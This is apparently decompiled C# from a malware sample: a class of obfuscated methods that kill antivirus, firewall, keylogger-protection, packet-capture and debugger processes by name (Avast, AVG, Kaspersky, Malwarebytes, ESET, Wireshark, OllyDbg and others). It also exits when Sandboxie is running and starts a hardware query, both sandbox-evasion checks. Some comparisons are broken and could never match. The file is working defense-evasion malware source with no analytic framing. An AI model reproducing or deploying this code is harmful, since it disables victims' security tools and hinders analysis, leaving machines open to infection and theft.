using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

[StandardModule]
internal sealed class Class5
{
	public static void smethod_0()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "ashWebSv.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void smethod_1()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "avgemc.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void smethod_2()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "clamauto.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void smethod_3()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "avp", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void smethod_4()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "keyscrambler", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void smethod_5()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "mbam", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void smethod_6()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "egui", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static bool smethod_7()
	{
		if (Process.GetProcessesByName("SbieSvc").Length >= 1)
		{
			Application.Exit();
			return true;
		}
		return false;
	}

	public static void smethod_8()
	{
		_ = Environment.UserName;
		string text = "SELECT * FROM Win32_VideoController";
		object[] array = new object[1] { text };
		bool[] array2 = new bool[1] { true };
		if (array2[0])
		{
			text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
		}
	}

	public static void smethod_9()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "wireshark", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void smethod_10()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = default(int);
			for (int i = 0; i <= num; i++)
			{
				if (Operators.CompareString(Strings.UCase(processes[num2].ProcessName), Strings.UCase(" zlclient"), false) == 0)
				{
					processes[num2].Kill();
				}
			}
		}
	}

	public static void smethod_11()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "ollydbg", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void smethod_12()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("outpost"), false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void smethod_13()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "FPAVServer.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}
}
